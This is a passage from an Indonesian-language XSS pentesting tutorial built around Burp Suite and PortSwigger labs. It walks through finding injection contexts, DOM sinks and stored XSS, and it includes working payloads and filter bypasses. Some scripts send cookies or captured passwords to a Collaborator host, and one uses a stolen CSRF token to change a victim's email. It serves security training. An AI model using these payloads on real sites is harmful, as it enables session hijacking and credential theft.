<xss id=x onfocus=alert(1) tabindex=1>   (plus #x in URL)
```

### SVG Bypass

```html
<svg><animatetransform onbegin=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><a><animate attributeName=href values=javascript:alert(1)/><text y=20>click</text></a></svg>
```

### Canonical Link Tag

```text
?'accesskey='x'onclick='alert(1)
```

### Cookie Theft

```html
<script>
fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))
</script>
```

### CSRF via XSS (Fetch Token)

```html
<script>
fetch('/my-account').then(r=>r.text()).then(html=>{
  var t=html.match(/name="csrf" value="(\w+)"/)[1];
  fetch('/my-account/change-email',{method:'POST',body:'csrf='+t+'&email=x@x.com',headers:{'Content-Type':'application/x-www-form-urlencoded'}})
})
</script>
```

### Password Capture

```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://COLLABORATOR/?u='+document.getElementById('username').value+'&p='+this.value)">
```

---

> **➡️ NEXT:** Setelah XSS selesai dan berhasil mendapat session/credentials, lanjut ke **[🧬 21 — XXE Workflow](/docs/xxe)** untuk handle XML-based injection, atau ke **[🔐 27 — IDOR / Access Control Workflow](/docs/idor-access-control)** jika akses admin panel sudah didapat tapi perlu escalate privileges lebih lanjut.
> 
> **Jika XSS menghasilkan internal network access:** lanjut ke **[🌐 22 — SSRF Workflow](/docs/ssrf)** karena XSS + fetch ke internal = SSRF via victim browser.

---

# 🎮 17. Interactive Decision Guide

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL ✅** dan **OUTPUT GAGAL ❌**. Output ditampilkan sebagaimana yang kamu lihat di panel Burp Suite. Ikuti panah sesuai yang kamu dapat. Jangan skip langkah.
> 
> **Primary tool di guide ini:** Burp Suite (Proxy → Repeater → Intruder → Collaborator). curl hanya dipakai untuk filter identification script di akhir.

---

## 🔧 PRE-FLIGHT: Setup Burp Suite

```text
1. Buka Burp Suite Community / Pro
2. Proxy → Open Browser  (atau Firefox + FoxyProxy → 127.0.0.1:8080)
3. Proxy → Intercept: OFF  (untuk browsing bebas dulu)
4. Browse ke target → semua request masuk ke HTTP History
5. Buat loot folder:
   mkdir -p ~/xss_loot/{payloads,cookies,notes}
```

**Output yang diharapkan — HTTP History mulai terisi:**

```text
[Burp → Proxy → HTTP History]

#   Method  URL                    Status  Length
1   GET     https://TARGET/        200     4821
2   GET     https://TARGET/search  200     1482
3   POST    https://TARGET/comment 302     0
...
```

---

## ═══════════════════════════════════════

## FASE 0: RECON & IDENTIFIKASI ATTACK SURFACE

## ═══════════════════════════════════════

> **Tujuan:** Sebelum inject apapun, pahami dulu di mana saja ada input dan di mana output-nya ditampilkan. XSS bukan coba-coba — kita perlu tahu exact sink-nya.

### Langkah 0.1 — Petakan Semua Input Points

```text
[Burp → Target → Site Map]
1. Klik kanan domain target → Spider / Crawl (jika Pro)
   Atau browse manual sambil Proxy aktif
2. Target → Site Map → klik domain
3. Kanan atas: filter → show all

Yang dicari:
- Form input (GET/POST)
- URL parameter (q=, search=, id=, msg=, redirect=)
- Cookie yang di-display kembali
- HTTP Header yang di-log (User-Agent, Referer, X-Forwarded-For)
```

**Output yang dicari — contoh input points di Site Map:**

```text
[Burp → Target → Site Map]

https://TARGET/
  ├── /search?q=                    ← GET param → kandidat Reflected XSS
  ├── /comment  [POST]              ← POST form → kandidat Stored XSS
  ├── /profile  [POST]              ← POST form → kandidat Stored XSS
  ├── /error?msg=                   ← GET param error msg → sering Reflected
  └── /product?id=                  ← GET param → coba reflect test

Cookie yang ter-set:
  session=abc123; HttpOnly; Secure
  tracking=xyz789                   ← TIDAK HttpOnly → menarik!
```

**Tabel input mapping yang diisi setelah fase ini:**

|Input Point|Method|Parameter|Tipe Kandidat|
|---|---|---|---|
|`/search`|GET|`q`|Reflected XSS|
|`/comment`|POST|`comment`|Stored XSS|
|`/profile`|POST|`bio`|Stored XSS|
|`/#hash`|Client|`location.hash`|DOM XSS|
|Cookie `tracking`|-|-|Reflected/Stored|

---

### Langkah 0.2 — Identifikasi Teknologi & CSP

```text
[Burp → HTTP History → klik request GET / → tab Response → tab Headers]

Cari:
- Server:
- X-Powered-By:
- Set-Cookie: (ada HttpOnly? Secure? SameSite?)
- Content-Security-Policy:

[Burp → HTTP History → klik response → Ctrl+F di body]
Cari: angular, ng-app, react, vue, jquery
```

**OUTPUT BERHASIL ✅ — Tidak ada CSP, tidak ada HttpOnly issue:**

```text
[Response Headers panel]

HTTP/2 200 OK
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
Set-Cookie: tracking=xyz789
Content-Type: text/html; charset=UTF-8
```

Cara baca:

|Header|Nilai|Implikasi|
|---|---|---|
|`Set-Cookie: tracking`|Tidak ada HttpOnly|`document.cookie` bisa baca cookie ini|
|`Set-Cookie: session`|HttpOnly + Secure|Tidak bisa via `document.cookie`|
|Tidak ada CSP|CSP bukan barrier di sini|Execution masih bergantung pada sink, context, encoding, dan sanitization — evaluasi seperti biasa|

➡️ Lanjut ke **Langkah 0.3**

---

**OUTPUT BERHASIL ✅ — Ada CSP:**

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

➡️ `'unsafe-inline'` terdeteksi — **periksa ada tidaknya nonce/hash** di directive yang sama; keduanya mengoverride `unsafe-inline`. Catat dan bawa ke **FASE 7 (CSP Bypass)** jika payload gagal.

---

**OUTPUT BERHASIL ✅ — AngularJS terdeteksi di response body:**

```text
[Burp → Response → Raw]
Ctrl+F: cari "ng-app"

Ditemukan:
<html ng-app="myApp">
<script src="/static/angular.min.js"></script>
```

➡️ **PENTING!** AngularJS = kandidat CSTI. Setelah basic reflect test, langsung ke **FASE 3C (AngularJS)**.

---

### Langkah 0.3 — Identifikasi Stored vs Reflected vs DOM

```text
Pola keputusan awal:

Input dikirim → langsung muncul di response SAMA?
  → YA  → Kandidat Reflected XSS
  → TIDAK, tapi muncul di halaman LAIN setelah submit?
      → Kandidat Stored XSS
  → TIDAK di response server, tapi ada di DOM browser?
      → Kandidat DOM XSS (F12 → cek location.hash / JS sink)
```

---

## ═══════════════════════════════════════

## FASE 1: REFLECTION TESTING

## ═══════════════════════════════════════

> **Tujuan:** Konfirmasi bahwa input kamu muncul kembali di response. **Reflection ≠ XSS** — ini hanya langkah pertama. Jangan tulis "XSS Found" hanya karena input muncul.

### Langkah 1.1 — Uji Reflection dengan Unique Marker

```text
[Burp → HTTP History]
1. Temukan request yang mengandung parameter yang dicurigai
2. Klik kanan → Send to Repeater (Ctrl+R)

[Burp → Repeater]
3. Di panel Request, ubah nilai parameter jadi marker unik:
   GET /search?q=XSS_MARKER_12345 HTTP/2

4. Klik Send

5. Di panel Response → tab Raw:
   Ctrl+F → ketik: XSS_MARKER_12345
```

**OUTPUT BERHASIL ✅ — Marker ditemukan di response:**

```text
[Burp Repeater → Response → Raw]
Ctrl+F: XSS_MARKER_12345   → 1 match

...
<div class="search-results">
  <p>Results for:</p>
  <div class="result">XSS_MARKER_12345</div>    ← marker muncul di sini
</div>
...
```

➡️ **Reflection terkonfirmasi!** Catat baris dan context-nya. Lanjut ke **Langkah 1.2**.

---

**OUTPUT BERHASIL ✅ — Marker muncul tapi di-encode:**

```text
[Burp Repeater → Response → Raw]
Ctrl+F: XSS_MARKER_12345   → 1 match

<div class="result">XSS_MARKER_12345</div>   ← marker OK

Tapi saat kamu kirim <script>alert(1)</script>:
Ctrl+F: script → 1 match

<div class="result">&lt;script&gt;alert(1)&lt;/script&gt;</div>  ← di-encode!
```

➡️ Ada HTML encoding. Tapi masih bisa exploit tergantung context. Tetap lanjut ke **Langkah 1.2** untuk identifikasi context persis.

---

**OUTPUT GAGAL ❌ — Marker tidak ditemukan sama sekali:**

```text
[Burp Repeater → Response → Raw]
Ctrl+F: XSS_MARKER_12345   → 0 matches

HTTP/2 200 OK
Content-Length: 1482
...
(tidak ada marker di body)
```

➡️ Input mungkin:

1. Tersimpan dan muncul di halaman lain → coba **FASE 4 (Stored XSS)**
2. Diproses client-side → coba **FASE 3 (DOM XSS)**
3. Difilter/diblock → coba parameter lain atau encoding berbeda

```text
[Burp → Repeater]
Coba forward dengan redirect:
Di Request panel: tambahkan header → Follow redirects: Always
Atau klik kanan → Request in browser → In original session

Kemudian browse ke halaman yang menampilkan stored data:
[Browser] → buka /posts, /comments, /profile
[Burp → HTTP History] → cari request ke halaman tersebut
[Response] → Ctrl+F: XSS_MARKER_12345
```

---

### Langkah 1.2 — Identifikasi Exact Context dari Response

> **Ini adalah langkah TERPENTING.** Salah baca context = payload tidak akan bekerja.

```text
[Burp Repeater → Response → Raw]
Lihat 5 baris sebelum dan sesudah di mana marker muncul.
```

**OUTPUT ✅ — HTML Body Context:**

```text
[Response panel]

83:  <section class="search">
84:    <p>Kamu mencari:</p>
85:    <div class="result">XSS_MARKER_12345</div>   ← di antara tag HTML
86:  </section>
```

➡️ Input berada di antara HTML tags → **HTML Body Context**. Lanjut ke **FASE 2A**.

---

**OUTPUT ✅ — HTML Attribute Context:**

```text
[Response panel]

41:  <input type="text"
42:         name="q"
43:         value="XSS_MARKER_12345"     ← di dalam nilai atribut
44:         class="search-input">
```

➡️ Input berada di dalam attribute value → **HTML Attribute Context**. Lanjut ke **FASE 2B**.

---

**OUTPUT ✅ — JavaScript String Context:**

```text
[Response panel]

90:  <script>
91:    var searchQuery = 'XSS_MARKER_12345';   ← di dalam JS string single quote
92:    displayResults(searchQuery);
93:  </script>
```

➡️ Input berada di dalam JavaScript string → **JS String Context**. Lanjut ke **FASE 2C**.

---

**OUTPUT ✅ — Template Literal Context:**

```text
[Response panel]

90:  <script>
91:    var message = `Welcome, XSS_MARKER_12345!`;  ← di backtick
92:  </script>
```

➡️ Input di dalam template literal → **FASE 2D**.

---

**OUTPUT ✅ — href / URL Context:**

```text
[Response panel]

45:  <a href="/search?q=XSS_MARKER_12345">Kembali</a>
```

atau:

```text
45:  <a href="XSS_MARKER_12345">Link</a>
```

➡️ Input menjadi nilai URL → **FASE 2E**.

---

## ═══════════════════════════════════════

## FASE 2: CONTEXT-SPECIFIC PAYLOAD TESTING

## ═══════════════════════════════════════

### FASE 2A — HTML Body Context

> Context: `<div>INPUT_DI_SINI</div>`

**Step 1: Coba basic script tag**

```text
[Burp Repeater → Request panel]
Ubah parameter:
GET /search?q=<script>alert(1)</script> HTTP/2

Klik Send

[Response panel] → Ctrl+F: script
```

**OUTPUT BERHASIL ✅ — Script tag muncul unescaped:**

```text
[Response → Raw]

<div class="result"><script>alert(1)</script></div>
```

```text
[Response → Render tab]
→ Render tab menampilkan alert popup (atau tertulis "1" di area render)
```

➡️ **XSS CONFIRMED!** Verifikasi di browser:

```text
[Burp Repeater] → kanan atas → "Show response in browser"
→ Copy URL → buka di browser → alert muncul
```

Lanjut ke **FASE 5 (Impact Assessment)**.

---

**OUTPUT GAGAL ❌ — Script tag di-encode:**

```text
[Response → Raw]

<div class="result">&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

➡️ `<script>` di-HTML-encode. Coba event handler:

```text
[Burp Repeater → Request]
q=<img src=x onerror=alert(1)>

[Response] Ctrl+F: onerror
```

**OUTPUT ✅ — img onerror muncul unescaped:**

```text
<div class="result"><img src=x onerror=alert(1)></div>
```

➡️ **XSS CONFIRMED via event handler!** Verifikasi di browser.

---

**OUTPUT GAGAL ❌ — Tag di-strip, hanya konten yang muncul:**

```text
[Response → Raw]

<div class="result">alert(1)</div>   ← tag hilang, isinya saja yang muncul
```

➡️ Tag stripping aktif. Coba:

```text
[Repeater] Coba satu per satu:
q=<img/src=x/onerror=alert(1)>         (slash sebagai separator)
q=<ImG SrC=x OnErRoR=alert(1)>         (case variation)
q=<svg onload=alert(1)>
q=<details open ontoggle=alert(1)>
q=<input autofocus onfocus=alert(1)>
q=<video><source onerror=alert(1)>
```

Kalau semua gagal → ke **FASE 6 (Filter Bypass via Intruder)**.

---

### FASE 2B — HTML Attribute Context

> Context: `<input value="INPUT_DI_SINI">`

**Step 1: Identifikasi quote type**

```text
[Burp Repeater → Response → Raw]
Lihat sekitar marker:
value="XSS_MARKER_12345"   → double quote
value='XSS_MARKER_12345'   → single quote
```

**Step 2A: Double quote context — break attribute**

```text
[Burp Repeater → Request]
q=" onmouseover="alert(1)

[Response] → Ctrl+F: onmouseover
```

**OUTPUT BERHASIL ✅ — Attribute break berhasil:**

```text
[Response → Raw]

<input type="text" value="" onmouseover="alert(1)" class="search-input">
```

```text
[Response → Render tab]
→ Halaman tampil normal, tapi ada input field baru yang sudah ter-inject
```

➡️ **XSS CONFIRMED!** Trigger: hover mouse di atas input field di browser.

Untuk auto-trigger (tidak perlu interaksi user):

```text
[Repeater → Request]
q=" autofocus onfocus="alert(1)

[Response → Raw]
<input value="" autofocus onfocus="alert(1)" ...>
```

**OUTPUT GAGAL ❌ — Double quote di-HTML-encode:**

```text
[Response → Raw]

<input value="&quot; onmouseover=&quot;alert(1)" class="search-input">
```

➡️ `"` di-encode jadi `&quot;`. Coba:

```text
[Repeater]
Jika ada event handler yang sudah ada di HTML (onclick, onchange):
q=');alert(1);//

Atau coba HTML entity — kadang parser decode entity SEBELUM JS:
Jika dalam onclick context: gunakan &apos; trick (lihat Section 5.6 MD ini)
```

---

**Step 2B: Single quote context — break attribute**

```text
[Repeater → Request]
q=' onmouseover='alert(1)

[Response] Ctrl+F: onmouseover
```

**OUTPUT BERHASIL ✅:**

```text
[Response → Raw]

<input value='' onmouseover='alert(1)' class="search-input">
```

➡️ **XSS CONFIRMED!**

**OUTPUT GAGAL ❌ — Single quote di-escape:**

```text
[Response → Raw]

<input value='\' onmouseover=\'alert(1)' ...>
```

atau:

```text
<input value='&#x27; onmouseover=&#x27;alert(1)' ...>
```

➡️ Quote di-escape. Cek apakah `\` juga di-escape:

```text
[Repeater]
q=\' onmouseover='alert(1)

[Response → Raw]
Jika muncul: <input value='\\' onmouseover='alert(1)'...>
→ Backslash tidak di-escape → exploit via \\' trick (lihat Section 5.4c MD)
```

---

### FASE 2C — JavaScript String Context

> Context: `var x = 'INPUT_DI_SINI';` atau `var x = "INPUT_DI_SINI";`

**Step 1: Identifikasi encoding yang diterapkan server**

```text
[Burp Repeater → Request]
Kirim karakter satu per satu untuk lihat mana yang di-escape:

q=test'test      → apakah ' muncul apa adanya atau jadi \'?
q=test"test      → apakah " muncul apa adanya atau di-encode?
q=test\test      → apakah \ muncul apa adanya atau jadi \\?
q=test<test      → apakah < muncul apa adanya atau jadi &lt;?
```

**Step 2: Break JS string (single quote, tidak di-escape)**

```text
[Repeater → Request]
q='-alert(1)-'

[Response] → Ctrl+F: alert
```

**OUTPUT BERHASIL ✅ — String break berhasil:**

```text
[Response → Raw]

<script>
  var searchQuery = ''-alert(1)-'';
  displayResults(searchQuery);
</script>
```

(Quote pertama menutup string, `-alert(1)-` adalah unary minus expression, quote ketiga membuka string baru. Valid JS.)

➡️ **XSS CONFIRMED!** Buka di browser untuk verifikasi alert.

Alternatif yang lebih bersih:

```text
[Repeater]
q=';alert(1);//

[Response → Raw]
var searchQuery = '';alert(1);//';
```

---

**OUTPUT GAGAL ❌ — Single quote di-backslash-escape:**

```text
[Response → Raw]

var searchQuery = '\'-alert(1)-\'';
```

➡️ Server meng-escape `'` → `\'`. Cek apakah `\` juga di-escape:

```text
[Repeater → Request]
q=test\test

[Response → Raw]
var searchQuery = 'test\test';    ← backslash TIDAK di-escape → gunakan \\ trick

atau:
var searchQuery = 'test\\test';   ← backslash DI-escape → coba </script> breakout
```

**Jika `\` TIDAK di-escape → gunakan `\\` trick:**

```text
[Repeater]
q=\'-alert(1)//

[Response → Raw]
var searchQuery = '\\'-alert(1)//';

Interpretasi JS:
- \\ = escaped backslash = literal karakter \
- '  = MENUTUP STRING (bukan bagian dari escape)
- -alert(1) = JS expression
- // = comment
```

**OUTPUT BERHASIL ✅:**

```text
[Response → Raw]
var searchQuery = '\\'-alert(1)//';
```

➡️ **XSS CONFIRMED!** Buka di browser → alert muncul.

---

**Jika `\` DAN `'` keduanya di-escape → `</script>` breakout:**

```text
[Repeater]
q=</script><script>alert(1)</script>

[Response → Raw]
<script>
  var searchQuery = '</script>
  <script>alert(1)</script>';
</script>
```

➡️ Browser menutup `<script>` pertama di tag `</script>` yang diinjek, kemudian `<script>alert(1)</script>` dieksekusi!

**OUTPUT BERHASIL ✅:**

```text
[Render tab]
→ Alert muncul di preview
```

---

### FASE 2D — JavaScript Template Literal Context

> Context: ``var x = `INPUT_DI_SINI`;``

```text
[Repeater → Request]
q=${alert(1)}

[Response] → Ctrl+F: alert
```

**OUTPUT BERHASIL ✅:**

```text
[Response → Raw]

<script>
  var message = `Welcome, ${alert(1)}!`;
</script>
```

`${}` dieksekusi sebagai JS expression → alert(1) jalan saat page load.

➡️ **XSS CONFIRMED!** Buka di browser.

---

**OUTPUT GAGAL ❌ — `${}` muncul literal (tidak di-eval):**

```text
[Response → Raw]

var message = `Welcome, ${alert(1)}!`;   ← muncul apa adanya di source
[Render tab] → Tidak ada alert
```

➡️ Verifikasi di browser — mungkin perlu actual JS execution:

```text
[Browser] → Buka URL langsung: https://TARGET/search?q=${alert(1)}
F12 → Console → lihat apakah ada JavaScript error
```

Jika template literal terkonfirmasi tapi karakter diblok:

```text
[Repeater]
q=${alert`1`}      → backtick call jika () diblok
```

---

### FASE 2E — URL/href Context

> Context: `<a href="INPUT_DI_SINI">` atau href yang me-reflect input

**Step 1: Test javascript: scheme**

```text
[Repeater → Request]
q=javascript:alert(1)

[Response] → Ctrl+F: javascript
```

**OUTPUT BERHASIL ✅:**

```text
[Response → Raw]

<a href="javascript:alert(1)">Website</a>
```

➡️ **XSS CONFIRMED!** Trigger: klik link di browser → alert muncul. (Stored XSS di href context → setiap user yang klik link akan ter-exploit)

---

**OUTPUT GAGAL ❌ — `javascript:` di-strip atau di-replace:**

```text
[Response → Raw]

<a href="">Website</a>                ← href dikosongkan
atau:
<a href="about:blank">Website</a>     ← di-replace ke safe URL
```

➡️ Coba bypass:

```text
[Repeater] Coba variasi:
q=JaVaScRiPt:alert(1)          → case variation
q=javascript%3aalert(1)         → URL-encoded colon
q=&#106;avascript:alert(1)      → HTML entity J
q=%6aavascript:alert(1)         → URL-encoded j
```

---

## ═══════════════════════════════════════

## FASE 3: DOM XSS ANALYSIS

## ═══════════════════════════════════════

> **Penting:** DOM XSS terjadi sepenuhnya di client-side. Burp Repeater tidak cukup — kamu HARUS pakai **Browser DevTools (F12)**. Server tidak pernah menerima payload DOM XSS.

### Langkah 3.1 — Cari DOM XSS Source di DevTools

```text
[Browser → F12 → Sources → Ctrl+Shift+F (Global Search)]

Ketik satu per satu:
- innerHTML
- outerHTML
- document.write
- eval(
- setTimeout(
- location.hash
- location.search
- document.URL
- document.referrer
- window.name
- jQuery(
- $("
- .html(
```

**OUTPUT BERHASIL ✅ — Source berbahaya ditemukan:**

```text
[DevTools → Sources → app.js → baris 47]

const q = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = q;       ← SINK!
```

```text
Trace:
location.search → URLSearchParams → q → innerHTML (SINK)
```

➡️ **DOM XSS path ditemukan!** Source: `location.search`, Sink: `innerHTML`. Ke **Langkah 3.2**.

---

**OUTPUT GAGAL ❌ — Tidak ada source berbahaya terlihat langsung:**

```text
[DevTools → Sources] → Global Search → tidak ada hasil untuk innerHTML
```

➡️ Mungkin ada dynamic loading atau minified JS. Coba:

```text
[DevTools → Sources] → klik file JS yang ada → {} (Pretty print)
→ Search ulang di file yang sudah di-unminify

[DevTools → Console]
Paste ini untuk monitor DOM changes:
var o = new MutationObserver(m => m.forEach(x => console.log('DOM change:', x)));
o.observe(document.body, {childList:true, subtree:true, attributes:true});

Kemudian interaksi di halaman → lihat output di Console
```

---

### Langkah 3.2 — Test Payload di Browser (Per Sink)

```text
[Browser → URL bar atau Console]
```

**Sink: `innerHTML`**

```text
[URL bar]: https://TARGET/search?q=<img src=1 onerror=alert(1)>

KENAPA bukan <script>? innerHTML tidak mengeksekusi <script>.
<img onerror> dieksekusi saat browser parse HTML baru via innerHTML.
```

**OUTPUT BERHASIL ✅:**

```text
[Browser] → Alert popup muncul: "https://TARGET" (domain ditampilkan)

[DevTools → Console]
Tidak ada error
```

---

**Sink: `document.write`**

Contoh source:

```javascript
document.write('<img src="/track?q=' + query + '">');
```

```text
[URL bar]: https://TARGET/search?q="><svg onload=alert(1)>
→ Closing " break dari src attribute, > close tag <img, lalu inject <svg>
```

**OUTPUT BERHASIL ✅:**

```text
[Browser] → Alert muncul saat page load
[DevTools → Elements] → terlihat <svg> element baru di DOM
```

---

**Sink: `eval()` atau `setTimeout(string)`**

```text
[URL bar]: https://TARGET/search?q=alert(1)
```

**OUTPUT BERHASIL ✅:**

```text
[Browser] → Alert "1" muncul
```

---

**Sink: jQuery `href` assignment**

```text
[URL bar]: https://TARGET/page?returnPath=javascript:alert(1)
→ Kemudian klik link "Back" di halaman
```

**OUTPUT BERHASIL ✅:**

```text
[Browser] → Klik "Back" → Alert muncul
```

---

### FASE 3C — AngularJS CSTI Testing

> Gunakan jika di FASE 0 terdeteksi `ng-app` di response.

**Step 1: Konfirmasi CSTI**

```text
[Burp Repeater → Request]
q={{7*7}}

[Response] → Ctrl+F: 49

Atau di browser:
https://TARGET/search?q={{7*7}}
```

**OUTPUT BERHASIL ✅ — CSTI terkonfirmasi:**

```text
[Response → Raw]
<div class="result">49</div>   ← AngularJS eval expression, 7×7=49

[Browser] → terlihat "49" di halaman (bukan "{{7*7}}")
```

➡️ **AngularJS CSTI confirmed!** Lanjut exploit:

```text
[Burp Repeater → Request]
q={{$on.constructor('alert(1)')()}}

[Browser] → buka URL → alert muncul
```

**Atau alternatif:**

```text
q={{constructor.constructor('alert(1)')()}}
```

---

**OUTPUT GAGAL ❌ — `{{7*7}}` muncul literal:**

```text
[Response → Raw]
<div class="result">{{7*7}}</div>   ← tidak di-eval, AngularJS tidak aktif di sini

[Browser] → terlihat "{{7*7}}" sebagai teks biasa
```

➡️ `ng-app` mungkin tidak mencakup area output ini.

```text
[DevTools → Elements]
Inspect area di mana hasil search muncul
Cari attribute ng-app atau ng-controller di parent element
```

---

**OUTPUT GAGAL ❌ — `{{7*7}}` di-HTML-encode:**

```text
[Response → Raw]
<div class="result">{{7*7}}</div>   ← muncul tapi karena angle bracket encode, bukan AngularJS issue

[Cek: apakah {{ dan }} lolos?]
[Repeater]
q=test{{marker}}test → lihat apakah {{ }} muncul utuh
```

---

## ═══════════════════════════════════════

## FASE 4: STORED XSS TESTING

## ═══════════════════════════════════════

> **Tujuan:** Input disimpan di database dan muncul saat halaman dibuka kembali, bisa oleh user lain atau admin.

### Langkah 4.1 — Konfirmasi Stored Reflection

```text
[Burp Proxy → Intercept: ON]
1. Submit form (comment, profile, search query)
2. Intercept request POST di Burp
3. Di Repeater: ubah field jadi marker:
   comment=STORED_MARKER_99999
4. Forward/Send

[Browser] → Navigate ke halaman yang menampilkan stored data
[Burp → HTTP History] → klik response halaman tersebut
[Response] → Ctrl+F: STORED_MARKER_99999
```

**OUTPUT BERHASIL ✅ — Marker muncul di halaman lain:**

```text
[HTTP History → response /post/1]
Ctrl+F: STORED_MARKER_99999

Ditemukan:
<div class="comment">
  <p>STORED_MARKER_99999</p>    ← tersimpan dan di-render
</div>
```

➡️ **Stored reflection terkonfirmasi!** Lanjut ke **Langkah 4.2**.

---

**OUTPUT GAGAL ❌ — Marker tidak muncul di halaman manapun:**

```text
[HTTP History] → browse semua halaman → Ctrl+F: STORED_MARKER_99999 → 0 matches
```

➡️ Input mungkin:

- Disimpan tapi ada approval flow (perlu akun lain / admin)
- Disimpan di area yang hanya admin bisa lihat → **Blind XSS** → FASE 8

---

### Langkah 4.2 — Inject Stored XSS Payload

```text
[Burp Repeater → POST request ke endpoint stored]
Ubah body:
comment=<script>alert(document.domain)</script>

Klik Send

[Browser] → Navigate ke halaman yang menampilkan comment
```

**OUTPUT BERHASIL ✅ — Alert muncul saat buka halaman:**

```text
[Browser] → buka /post/1 → alert popup langsung muncul: "target.com"

[Burp → HTTP History → response /post/1]
Ctrl+F: script

<div class="comment"><script>alert(document.domain)</script></div>
```

➡️ **STORED XSS CONFIRMED!** Setiap user yang buka halaman ini akan tereksekusi. Lanjut ke **FASE 5 (Impact Assessment)**.

---

**OUTPUT GAGAL ❌ — Payload di-encode saat ditampilkan:**

```text
[Response → Raw]
<div class="comment">&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

➡️ Output encoding aktif saat render. Coba:

```text
[Repeater] Ganti payload:
comment=<img src=x onerror=alert(document.domain)>
comment=<svg onload=alert(document.domain)>

[Browse ke halaman] → cek apakah alert muncul
```

**OUTPUT BERHASIL ✅ — img onerror tersimpan:**

```text
[Response → Raw]
<div class="comment"><img src=x onerror=alert(document.domain)></div>

[Browser] → img error trigger → alert muncul
```

---

**OUTPUT GAGAL ❌ — Semua tag di-strip:**

```text
[Response → Raw]
<div class="comment">alert(document.domain)</div>  ← tag hilang, content doang
```

➡️ Tag stripping aktif pada output stored content. Lanjut ke **FASE 6 (Filter Bypass)**.

---

## ═══════════════════════════════════════

## FASE 5: IMPACT ASSESSMENT

## ═══════════════════════════════════════

> **`alert(1)` hanya PoC.** Untuk lab PortSwigger dan pentest nyata, buktikan impact yang sesungguhnya.

### FASE 5A — Cookie Theft via Burp Collaborator

```text
[Burp → Burp Collaborator]
1. Klik "Copy to clipboard"
→ Dapat URL seperti: abc123xyz456.oastify.com

2. Buat payload cookie theft:
   <script>
   fetch('https://abc123xyz456.oastify.com/?c='+encodeURIComponent(document.cookie))
   </script>

3. [Repeater] → Kirim payload sebagai stored content
   (comment, profile, dll — field yang dilihat admin/victim)

4. Admin bot di lab PortSwigger otomatis buka halaman

5. [Burp Collaborator] → Klik "Poll now"
```

**OUTPUT BERHASIL ✅ — Collaborator mendapat hit:**

```text
[Burp Collaborator → Interactions panel]

Type     Time                  Client IP      Comment
HTTP     2026-09-28 10:30:12   10.10.11.1    GET /?c=session%3Dabc123admintoken

Request:
GET /?c=session%3Dabc123admintoken HTTP/1.1
Host: abc123xyz456.oastify.com
```

➡️ Cookie admin berhasil dicuri!

```text
Decode: session%3D → session=
Hasil: session=abc123admintoken

[Browser] → F12 → Application → Cookies
→ Tambah/edit cookie: session = abc123admintoken
→ Refresh halaman → logged in sebagai admin!
```

---

**OUTPUT GAGAL ❌ — Collaborator tidak mendapat hit:**

```text
[Collaborator → Poll now]
(tidak ada interaction muncul setelah beberapa menit)
```

➡️ Kemungkinan:

1. Cookie adalah `HttpOnly` → `document.cookie` kosong → cek **FASE 5C (CSRF via XSS)**
2. Payload tidak tersimpan dengan benar → verifikasi di browser manual
3. Outbound blocked → coba dengan `<img src=...>` sebagai alternatif fetch
4. Collaborator URL tidak reachable di lingkungan lab → pakai **Exploit Server PortSwigger**

```text
Alternatif dengan img (bypass beberapa CSP yang blok fetch):
<script>
new Image().src='https://abc123xyz456.oastify.com/?c='+document.cookie
</script>
```

---

**Jika `document.cookie` kosong (HttpOnly aktif):**

```text
[Browser → F12 → Application → Cookies]
Perhatikan kolom "HttpOnly": true → cookie TIDAK bisa via document.cookie
```

```text
[Collaborator] → hit datang tapi dengan query:
GET /?c=   ← cookie kosong!
```

➡️ Cookie HttpOnly → lanjut ke **FASE 5C (CSRF via XSS)** atau **FASE 5B (Credential Capture)**.

---

### FASE 5B — XSS to Password Capture

> Pakai saat HttpOnly aktif — inject form palsu yang di-autofill browser.

```text
[Burp Repeater → stored field (misal comment)]
Payload:
<input name=username id=username>
<input type=password name=password onchange="
var u=document.getElementById('username').value;
fetch('https://COLLABORATOR-URL/?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(this.value))
">
```

```text
[Burp Collaborator] → Poll now setelah admin buka halaman
```

**OUTPUT BERHASIL ✅:**

```text
[Collaborator → Interactions]

GET /?user=administrator&pass=s3cr3t_p4ssw0rd HTTP/1.1
Host: abc123.oastify.com
```

➡️ Credentials admin berhasil captured!

---

### FASE 5C — XSS to CSRF Bypass

> Pakai saat XSS ada tapi cookie HttpOnly, dan ingin melakukan action sebagai victim.

```text
[Burp → Browser] → navigate ke halaman akun (misal /my-account)
[Response] → Ctrl+F: csrf → temukan nama dan format token
   <input name="csrf" value="nROD4MLZQJB7Yv0mJk9U8AY7wK5EoqXt">
```

```text
[Repeater] → Stored payload:
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      body: 'csrf='+token+'&email=attacker@evil.com',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });
  });
</script>
```

**OUTPUT BERHASIL ✅ — Action berhasil dilakukan atas nama victim:**

```text
[Burp → HTTP History] → setelah XSS trigger di browser admin
→ Lihat POST /my-account/change-email dengan cookie admin
→ Response: 302 redirect ke /my-account

[Browser] → Login sebagai admin → /my-account → email sudah berubah ke attacker@evil.com
```

---

## ═══════════════════════════════════════

## FASE 6: FILTER BYPASS — BURP INTRUDER

## ═══════════════════════════════════════

> **Prinsip:** Jangan tebak bypass. Identifikasi dulu APA yang diblok, kemudian mutate secara sistematis.

### Langkah 6.1 — Tag Fuzzing dengan Burp Intruder

```text
Skenario: <script>alert(1)</script> diblok di Repeater.
Perlu tahu tag mana yang lolos.

[Burp Repeater → kanan atas: Send to Intruder (Ctrl+I)]

[Intruder → Positions tab]
1. Clear § (hapus semua auto-marker)
2. Ubah parameter:
   q=<§xss§>
   (§ adalah injection point: yang akan di-fuzz adalah nama tag)
3. Attack type: Sniper

[Intruder → Payloads tab]
1. Payload type: Simple list
2. Paste list tag dari PortSwigger XSS cheat sheet:
   script
   img
   svg
   body
   iframe
